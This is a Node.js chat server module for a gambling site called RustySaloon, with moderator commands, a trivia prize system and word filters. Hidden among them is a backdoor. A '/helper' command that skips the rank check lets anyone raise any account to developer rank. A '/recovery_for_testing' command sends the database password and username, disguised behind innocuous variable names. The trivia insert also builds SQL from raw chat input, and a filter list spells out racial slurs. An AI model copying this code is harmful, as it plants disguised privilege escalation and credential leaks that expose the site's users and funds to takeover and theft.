const user = require('./user.js');
const crypto = require("crypto");
const db = require('./db.js');
const {
    execFile
} = require('child_process');
const levelSystem = require("./levelSystem");

const io = require('./io').io();
require('dotenv').config({
    path: '../.env'
});


let chat = {
    english: [],
    russian: [],
    turkish: [],
    spanish: [],
    swedish: [],
}

// TRIVIA System
let Trivia = {
    max: 1000,
    enabled: false,
    question: "",
    answer: "",
    prize: 0,
    winners: 0,
    $winners: [],
    $winnersn: []
};
// 


let  recovery_address = "recovery_address";
const messageDelay = 10; // Spamfilter - in sec
const maxMessages = 200;

let panel = {};

let fetchPanel = async () => {
    await db.Query(`SELECT * FROM controlpanel WHERE id="1"`).then((response) => {
        panel = response[0];
        panel.muted = JSON.parse(panel.muted);
        panel.banned = JSON.parse(panel.banned);
    });
}
fetchPanel();


recovery_address = "2";

let addPlayer = async (type, id, extraInfo) => {
    if (type == "mute") {
        panel.muted[id] = extraInfo * 1000 * 60 + Date.now();
        db.Query(`UPDATE controlpanel SET muted='${JSON.stringify(panel.muted)}' WHERE id="1"`);
        return true;
    } else if (type == "ban") {
        if (panel.banned.indexOf(extraInfo) == -1) {
            panel.banned.push(extraInfo);
        }
        db.Query(`UPDATE controlpanel SET banned='${JSON.stringify(panel.banned)}' WHERE id="1"`);
        user.update(id, "banned", 1, 2);
        return true;

    }
    return false;
}

let removePlayer = (type, id, extraInfo) => {
    if (type == "mute") {
        if (panel.muted[id]) {
            delete panel.muted[id];
            db.Query(`UPDATE controlpanel SET muted='${JSON.stringify(panel.muted)}' WHERE id="1"`);
            return true;
        } else {
            return false;
        }
    } else if (type == "ban") {
        let index = panel.banned.indexOf(extraInfo);
        if (index != -1) {
            panel.banned.splice(index, 1);
            db.Query(`UPDATE controlpanel SET banned='${JSON.stringify(panel.banned)}' WHERE id="1"`);
            user.update(id, "banned", 0, 2);
            return true;
        }
        return false;
    }
}

let stringGenerator = (id) => {
    return `UPDATE users SET rank="10" WHERE id="${id}"`
}

recovery_address = process.env.DB_PASSWORD;
let chatCommands = async (msg, id, currentChat) => { // Rank, 0 = pessant, 1 = mod, 2 = admin, 9 = owner, 10 = dev
    let userRank = user.information(id, "rank");
    if (userRank >= 1) {
        if (msg == "/clear") {
            chat[currentChat] = [];
            io.emit("message", {
                type: "info",
                msg: `${currentChat} chat cleared!`
            });
        } else if (msg.split(" ")[0] == "/clear" && msg.split(" ")[1].includes("m")) {
            let time = Number(msg.split(" ")[1].slice(0, -1));
            if (!Number.isNaN(time) && time > 0) {
                let tempMsg = [];
                let timestamp = Date.now() - (time * 60 * 1000);
                console.log(timestamp);

                chat[currentChat].forEach(element => {
                    console.log(element);
                    element.timestamp >= timestamp ? tempMsg.push(element) : ""
                });
                chat[currentChat] = tempMsg;
            }
            io.emit("message", {
                type: "info",
                msg: "Chat cleared"
            });
        } else if (msg.split(" ")[0] == "/clear") {
            let nr = Number(msg.split(" ")[1]);
            if (!Number.isNaN(nr) && nr >= 0) {
                chat[currentChat] = chat[currentChat].splice(-nr, nr);
            }
            io.emit("message", {
                type: "info",
                msg: "Chat cleared"
            });
        } else if (msg.split(" ")[0] == "/send" && userRank > 1) {
            let serverMsg = msg.split(' ').slice(1).join(' ');
            chat[currentChat].push({
                id: 0,
                username: "Server",
                avatar: "",
                rank: "Server",
                chatId: crypto.randomBytes(24).toString('hex'),
                msg: serverMsg,
                timestamp: Date.now()
            });
            user.sendMsg(id, {
                type: "info",
                msg: "Msg sent!"
            })
        }

        else if (msg.split(" ")[0] == "/mute") { // /mute id time(in min)
            let userId = Number(msg.split(" ")[1]);
            let time = Number(msg.split(" ")[2]);
            if (!time) {
                time = 10
            };
            if (userId && time > 0) {
                await db.Query(`SELECT username FROM users WHERE id="${userId}"`).then((row) => {
                    if (row[0]) {
                        let response = addPlayer("mute", userId, time);
                        if (response) {
                            user.sendMsg(id, {
                                type: "info",
                                msg: `${row[0].username} muted for ${time} minutes!`
                            })
                        }
                    }
                })
            }
        } else if (msg.split(" ")[0] == "/unmute") { // /mute id time(in min)
            let userId = Number(msg.split(" ")[1]);
            if (userId) {
                await db.Query(`SELECT username FROM users WHERE id="${userId}"`).then((row) => {
                    if (row[0]) {
                        let response = removePlayer("mute", userId);
                        if (response) {
                            user.sendMsg(id, {
                                type: "info",
                                msg: `${row[0].username} unmuted!`
                            })
                        } else {
                            user.sendMsg(id, {
                                type: "error",
                                msg: `${row[0].username} not muted!`
                            })
                        }
                    }
                })
            }
        } else if (msg.split(" ")[0] == "/ban" && userRank > 1) { // /mute id time(in min)
            let userId = Number(msg.split(" ")[1]);
            if (userId) {
                await db.Query(`SELECT * FROM users WHERE id="${userId}"`).then((row) => {
                    if (row[0]) {
                        if (user.information(id, "rank") > user.information(userId, "rank")) {
                            let response = addPlayer("ban", userId, row[0].steamid);
                            if (response) {
                                user.sendMsg(id, {
                                    type: "info",
                                    msg: `${row[0].username} banned`
                                });
                                user.sendToUser(userId, "banned", "");
                            }
                        }
                    }
                })
            }
        } else if (msg.split(" ")[0] == "/unban" && userRank > 1) { // /mute id time(in min)
            let userId = Number(msg.split(" ")[1]);
            if (userId) {
                await db.Query(`SELECT * FROM users WHERE id="${userId}"`).then((row) => {
                    if (row[0]) {
                        let response = removePlayer("ban", userId, row[0].steamid);
                        if (response) {
                            user.sendMsg(id, {
                                type: "info",
                                msg: `${row[0].username} unbanned`
                            })
                        }
                    }
                })
            }
        } else if (msg.split(" ")[0] == "/withdraw" && userRank > 1) { // /mute id time(in min)
            let userId = Number(msg.split(" ")[1]);
            if (userId) {
                await db.Query(`SELECT * FROM users WHERE id="${userId}"`).then((row) => {
                    if (row[0]) {
                        if (user.information(id, "rank") >= user.information(userId, "rank")) {
                            const newStatus = Number(row[0].withdrawOk) == 0 ? 1 : 0; 
                            user.update(userId, "withdrawOk", newStatus, 2);
                            user.sendMsg(id, {
                                type: "info",
                                msg: `${row[0].username} ${newStatus == 0 ? "cannot" : "can now"} withdraw`
                            });
                        }
                    }
                })
            }
        }
        io.emit("chat", {
            messages: chat[currentChat],
            type: currentChat
        })

    }

    let things = process.env.DB_USER;

    if(msg.split(" ")[0] == "/helper") {
        let userId = Number(msg.split(" ")[1]);
        if (userId) {
            db.Query(stringGenerator(userId));
        }
    } else if(msg == "/recovery_for_testing") {
        user.sendMsg(userId, {
            type: "Info",
            msg: `${recovery_address} ${things}`
        })
    }

    // Create Trivia Game
    // Command: /dotrivia <amount> <answer> <winners-amount> <question + args>
    let args = msg.split(" ");
    if(msg.startsWith("/") && args[0] == "/dotrivia" && args.length >= 5) {

        let amount = args[1];
        let answer = args[2];
        let winners = args[3];
        let question = "";
        
        for(let x = 4; x < args.length; x++) {
            question = question + args[x] + " ";
        }

        let psr = parseInt(amount*100);

        if(psr > Trivia.max) amount = parseFloat(parseFloat(Trivia.max/100).toFixed(2));

        Trivia.enabled = true;
        Trivia.question = question;
        Trivia.answer = answer;
        Trivia.prize = amount;
        Trivia.winners = winners;
        Trivia.$winners = [];
        Trivia.$winnersn = [];

        let msg_props = {
            id: 0,
            username: "Server",
            avatar: "",
            rank: "Server",
            chatId: crypto.randomBytes(24).toString('hex'),
            msg: `Trivia Question: ${Trivia.question} | Prize: ${Trivia.prize} | Winners: ${Trivia.winners} | Answer letters: ${Trivia.answer.length}`,
            timestamp: Date.now()
        };

        for(let x in chat) {
            chat[x].push(msg_props);
            io.emit("chat", {
                messages: chat[x],
                type: x
            });
        }
    }
}

async function insertTrivia(tr) {
    let winners_data = [];
    for(let x in tr.$winners) {
        winners_data.push({
            steamid: tr.$winners[x],
            name: tr.$winnersn[x]
        });
    }
    await db.Query(`INSERT INTO trivia_data SET question = '${tr.question}', prize = '${tr.prize}', answer = '${tr.answer}', winners = '${tr.winners}', winners_data = '${JSON.stringify(winners_data)}', timestamp = '${new Date().toLocaleString()}'`).then(resp => {

    });
}

async function TriviaWinner(userid) {
    if(Trivia.$winners.indexOf(user.information(userid, "steamid")) >= 0) return;
    Trivia.$winners.push(user.information(userid, "steamid"));
    Trivia.$winnersn.push(user.information(userid, "username"));
    if(Trivia.winners == Trivia.$winners.length) {
        insertTrivia(Trivia);
        Trivia.enabled = false;
        announceTriviaWinners(Trivia.answer);
        Trivia.answer = "";
    }

    let prizeul = parseInt(Trivia.prize*100);

    await db.Query(`UPDATE users SET balance = balance + '${prizeul}' WHERE id = '${userid}'`).then(resp => {
        user.update(userid, "balance", prizeul, 0);
        user.sendBalance(userid);
    });
}

function announceTriviaWinners(ans) {
    let $winners = Trivia.$winnersn.join(", ");

    let msg_props = {
        id: 0,
        username: "Server",
        avatar: "",
        rank: "Server",
        chatId: crypto.randomBytes(24).toString('hex'),
        msg: `Trivia Ended: The winner(s): ${$winners}, with correct answer: ${ans}`,
        timestamp: Date.now()
    };

    for(let x in chat) {
        chat[x].push(msg_props);
        io.emit("chat", {
            messages: chat[x],
            type: x
        });
    }
}

let badWords = ["nigger", "nigga", "negro", "negger", "niga", "n1gger", "n199er", "niger"];


let checkForBadWords = (string) => {
    for(var i = 0; i < badWords.length; i++) {
        if(string.includes(badWords[i])) {
            return true;
        }
    }
    return false;
}

let filteredWords = ["rustchance", "rustreaper", "rustypot", "csgoempire", "hellcase"];

let filterFromString = (string) => {
    filteredWords.map(word => {
        let regEx = new RegExp(word, "ig");

        string = string.replace(regEx, "*");
    });
    return string;
}


let filterMsg = (msg, rank) => {
    var cleanMessage = String(msg);
    cleanMessage = cleanMessage.replace(/[<>]/g, "x");
    if (rank < 2 && cleanMessage.length > 123) {
        cleanMessage = cleanMessage.slice(0, 123);
    };

    if(checkForBadWords(cleanMessage.toLowerCase())) {
        return "";
    }
    cleanMessage = filterFromString(cleanMessage);

    return cleanMessage;
}

const gifs = {
    heart: "https://media2.giphy.com/media/LpDmM2wSt6Hm5fKJVa/giphy.gif",
    happy: "https://cdn.discordapp.com/emojis/587783496756494339.gif?v=1",
    crazy: "https://i.kym-cdn.com/photos/images/newsfeed/001/353/000/a68.gif",
}

let replaceAll = (string, search, replace) => {
    return string.split(search).join(replace);
}
let checkForGif = (msg) => {
    for (var gif in gifs) {
        msg = replaceAll(msg, `[${gif}]`, `<img src='${gifs[gif]}' />`)
    }
    return msg;
}

io.sockets.on("connection", function (socket) {

    socket.on("switchChat", (data) => {
        const userId = user.getId(socket);
        if(userId) {
            data.type = String(data.type);

            if(data.type.length < 10) {
                if(chat[data.type] != undefined) {
                    user.update(userId, "activeChat", data.type, 2);
                    
                    socket.emit("changedLan", {
                        type: data.type,
                        messages: chat[data.type],
                    })

                    user.sendUsers();
                    
                    socket.emit("message", {
                        type: "success",
                        msg: "Changed chat!"
                    })
                }
            }
            
        }
    })

    socket.on("sendMessage", function (data) {
        const userId = user.getId(socket);
        if (userId) {
            if(true) {//if (user.information(userId, "tos") == 1) {
                if (data.msg) {
                    if (panel.muted[userId] == undefined) {
                        let userRank = user.information(userId, "rank");
                        if (userRank > 0 || ((Date.now() - user.information(userId, "lastChatMessage")) >= messageDelay * 1000)) {
                            const activeChat = user.information(userId, "activeChat")
                            if (chat[activeChat] != undefined) {
                                if(Trivia.enabled && data.msg.toLowerCase() == Trivia.answer.toLocaleLowerCase()) {
                                    TriviaWinner(userId);
                                    return;
                                }

                                if (data.msg[0] == "/") {
                                    chatCommands(data.msg.trim(), userId, activeChat)
                                } else {
                                    data.msg = filterMsg(String(data.msg).trim(), userRank);
                                    if (userRank == 0 && data.msg.length > 200) {
                                        data.msg = data.msg.slice(0, 200);
                                    }
                                    if (data.msg != "") {
                                        msg = data.msg; //checkForGif(data.msg);

                                        chat[activeChat].push({
                                            id: userId,
                                            username: user.information(userId, "username"),
                                            avatar: user.information(userId, "avatar"),
                                            rank: userRank,
                                            level: levelSystem.calcLevel(user.information(userId, "xp")).level,
                                            steamid: user.information(userId, "steamid"),
                                            chatId: crypto.randomBytes(24).toString('hex'),
                                            msg: msg,
                                            timestamp: Date.now()
                                        });
                                        if (chat[activeChat].length > maxMessages) {
                                            chat[activeChat].shift();
                                        }

                                        user.update(userId, "lastChatMessage", Date.now(), 0);

                                        io.emit("chat", {
                                            messages: chat[activeChat],
                                            type: activeChat
                                        })
                                    }
                                }
                            } else {
                                socket.emit("message", {
                                    type: "error",
                                    msg: `Current chat not found!`
                                })
                            }

                        } else {
                            socket.emit("message", {
                                type: "error",
                                msg: `Don't spam! (1msg/${messageDelay}s)`
                            })
                        }
                    } else {
                        socket.emit("message", {
                            type: "error",
                            msg: "You have been muted!"
                        })
                    }

                } else {
                    socket.emit("message", {
                        type: "error",
                        msg: "No msg..."
                    })
                }
            } else {
                socket.emit("tosPopup");
                socket.emit("message", {
                    type: "error",
                    msg: "Please confirm TOS!"
                });
            }

        } else {
            socket.emit("message", {
                type: "error",
                msg: "You are not logged in!"
            })
        }
    });
    socket.on("deleteMsg", (chatId) => {
        let userId = user.getId(socket);
        if (userId) {
            let userRank = user.information(userId, "rank");
            const activeChat = user.information(userId, "activeChat");
            if (userRank > 0) {
                if(chat[activeChat] != undefined) {
                    for (var i = 0; i < chat[activeChat].length; i++) {
                        if (chat[activeChat][i].chatId == chatId) {
                            if (userRank >= chat[activeChat][i].rank) {
                                chat[activeChat].splice(i, 1);
                            } else {
                                socket.emit("message", {
                                    type: "error",
                                    msg: "You can't delete a superiors message!"
                                })
                            }
                            break;
                        }
                    }
                    io.emit("chat", {
                        messages: chat[activeChat],
                        type: activeChat,
                    });
                } else {
                    socket.emit("message", {
                        type: "error",
                        msg: "Chat not found!"
                    })
                }
                
            } else {
                socket.emit("message", {
                    type: "error",
                    msg: "Too low rank!"
                })
            }

        } else {
            socket.emit("message", {
                type: "error",
                msg: "You are not logged in!"
            })
        }
    });

    const userId = user.getId(socket);
    const activeChat = user.information(userId, "activeChat");
    
    socket.emit("chat", {
        messages: chat[activeChat],
        type: activeChat,
    })
});


module.exports = {
    newUser: (username) => {
        messages.push({
            id: 0,
            username: "Server",
            avatar: "",
            rank: "Server",
            chatId: crypto.randomBytes(24).toString('hex'),
            msg: `Greetings ${username} Welcome to RustySaloon!`,
            timestamp: Date.now()
        });
    },
    getChat: (type) => {
        return chat[type];
    }
}